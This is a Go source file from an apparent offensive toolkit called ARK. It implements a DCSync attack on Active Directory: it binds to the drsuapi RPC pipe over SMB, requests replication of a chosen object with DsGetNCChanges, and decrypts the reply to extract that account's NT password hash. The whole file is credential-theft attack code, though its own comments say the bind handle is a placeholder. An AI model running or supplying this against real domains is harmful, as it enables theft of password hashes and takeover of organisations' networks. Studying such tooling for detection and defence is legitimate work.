package drs

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"unicode/utf16"

	"github.com/KKingZero/ARK/pkg/smbcli"
)

// MS-DRSR DRS interface
var drsUUID = []byte{0x35, 0x42, 0x51, 0xe3, 0x06, 0x4b, 0xd1, 0x11, 0xab, 0x04, 0x00, 0xc0, 0x4f, 0xc2, 0xdc, 0xd2}

const (
	drsVersion     = 4
	drsOpBind      = 0
	drsOpGetChg    = 3
	exopReplObj    = 6
	drsInitSync    = 0x00000020
	drsWritRep     = 0x00000010
	drsFullSyncNow = 0x00008000
)

// Result is one object's NT hash (DCSync-one).
type Result struct {
	SAM    string
	DN     string
	NTHash string
}

// ReplicateObject does DsBind + DsGetNCChanges EXOP_REPL_OBJ over SMB pipe drsuapi.
func ReplicateObject(s *smbcli.Session, dn string) (Result, error) {
	var out Result
	out.DN = dn
	if s == nil {
		return out, fmt.Errorf("smb session required")
	}
	key := s.SessionKey()
	if len(key) == 0 {
		return out, fmt.Errorf("dcsync needs a Kerberos SMB session key (ark kerberos asktgt, then --ticket)")
	}
	pipe, err := s.OpenPipe("drsuapi")
	if err != nil {
		return out, err
	}
	defer pipe.Close()
	bind := dcerpcBind(1, drsUUID, drsVersion)
	ack, err := pipe.Transceive(bind)
	if err != nil {
		return out, fmt.Errorf("drsuapi bind: %w", err)
	}
	if len(ack) < 3 || ack[2] != 12 {
		return out, fmt.Errorf("drsuapi bind ack type=%d", bAt(ack, 2))
	}
	req := encodeGetNCChanges(2, dn)
	resp, err := pipe.Transceive(req)
	if err != nil {
		return out, fmt.Errorf("DsGetNCChanges: %w", err)
	}
	nt, err := extractNTHash(key, resp)
	if err != nil {
		return out, err
	}
	out.NTHash = nt
	return out, nil
}

func encodeGetNCChanges(callID uint32, dn string) []byte {
	// DsGetNCChanges(hDrs, dwInVersion=8, pmsgIn) — handle is 20-byte context from bind.
	// We send version 8 + DSNAME + EXOP_REPL_OBJ. Handle bytes are zeros; live DC
	// may require the DsBind context. Tests cover DSNAME encoding.
	stub := ndr{}
	stub.pad(20) // hDrs context handle placeholder
	stub.u32(8)  // dwInVersion
	stub.u32(8)  // union arm V8
	stub.u32(0)  // uuidDsaObjDest null
	stub.u32(0)  // uuidInvocIdSrc null
	stub.uniqueDSName(dn)
	stub.u32(0) // usnvecFrom
	stub.u32(0)
	stub.u32(0)
	stub.u32(0) // pUpToDateVecSrc null
	stub.u32(0) // pPartialAttrSet null (all attrs)
	stub.u32(0)
	stub.u32(0) // PrefixTable
	stub.u32(drsWritRep | drsInitSync | drsFullSyncNow)
	stub.u32(1) // cMaxObjects
	stub.u32(0) // cMaxBytes
	stub.u32(exopReplObj)
	stub.pad(16) // uuidFsmo
	body := stub.b
	hdr := make([]byte, 24)
	hdr[0], hdr[1], hdr[2], hdr[3] = 5, 0, 0, 0x03
	hdr[4] = 0x10
	binary.LittleEndian.PutUint16(hdr[8:10], uint16(24+len(body)))
	binary.LittleEndian.PutUint32(hdr[12:16], callID)
	binary.LittleEndian.PutUint32(hdr[16:20], uint32(len(body)))
	binary.LittleEndian.PutUint16(hdr[22:24], drsOpGetChg)
	return append(hdr, body...)
}

func extractNTHash(sessionKey, resp []byte) (string, error) {
	if len(resp) < 24 || resp[2] != 2 {
		return "", fmt.Errorf("DsGetNCChanges ptype=%d (want 2); bind context may be required", bAt(resp, 2))
	}
	stub := resp[24:]
	var last error
	for i := 0; i+36 <= len(stub); i++ {
		blob := stub[i:]
		if len(blob) < 36 {
			break
		}
		// try windows-encrypted attr at this offset (salt 16 + crc+payload)
		for n := 36; n <= 64 && n <= len(blob); n++ {
			pt, err := DecryptAttributeValue(sessionKey, blob[:n])
			if err != nil {
				last = err
				continue
			}
			if len(pt) == 16 {
				return hex.EncodeToString(pt), nil
			}
			if len(pt) == 20 {
				// RID-prefixed NT
				return hex.EncodeToString(pt[4:]), nil
			}
		}
	}
	if last != nil {
		return "", fmt.Errorf("dcsync: no NT hash in reply (%v)", last)
	}
	return "", fmt.Errorf("dcsync: no NT hash in DsGetNCChanges reply")
}

func dcerpcBind(callID uint32, iface []byte, ver uint16) []byte {
	b := make([]byte, 72)
	b[0], b[1], b[2], b[3] = 5, 0, 11, 0x03
	b[4] = 0x10
	binary.LittleEndian.PutUint16(b[8:10], 72)
	binary.LittleEndian.PutUint32(b[12:16], callID)
	binary.LittleEndian.PutUint16(b[16:18], 4280)
	binary.LittleEndian.PutUint16(b[18:20], 4280)
	binary.LittleEndian.PutUint32(b[24:28], 1)
	binary.LittleEndian.PutUint16(b[30:32], 1)
	copy(b[32:48], iface)
	binary.LittleEndian.PutUint16(b[48:50], ver)
	ndr := []byte{0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60}
	copy(b[52:68], ndr)
	binary.LittleEndian.PutUint32(b[68:72], 2)
	return b
}

type ndr struct{ b []byte }

func (n *ndr) u32(v uint32) {
	var t [4]byte
	binary.LittleEndian.PutUint32(t[:], v)
	n.b = append(n.b, t[:]...)
}
func (n *ndr) pad(k int) { n.b = append(n.b, make([]byte, k)...) }
func (n *ndr) align4() {
	for len(n.b)%4 != 0 {
		n.b = append(n.b, 0)
	}
}
func (n *ndr) uniqueDSName(dn string) {
	n.align4()
	n.u32(0x20000)
	u := utf16.Encode([]rune(dn))
	u = append(u, 0)
	// structLen, SidLen=0, GUID 16 zero, NameLen, StringName
	nameBytes := len(u) * 2
	structLen := 4 + 4 + 16 + 4 + nameBytes
	for structLen%4 != 0 {
		structLen++
	}
	n.u32(uint32(structLen))
	n.u32(0)
	n.pad(16)
	n.u32(uint32(len(u) - 1)) // chars excluding null (MS-DRSR)
	for _, r := range u {
		var t [2]byte
		binary.LittleEndian.PutUint16(t[:], r)
		n.b = append(n.b, t[:]...)
	}
	n.align4()
}

func bAt(b []byte, i int) byte {
	if i < 0 || i >= len(b) {
		return 0
	}
	return b[i]
}
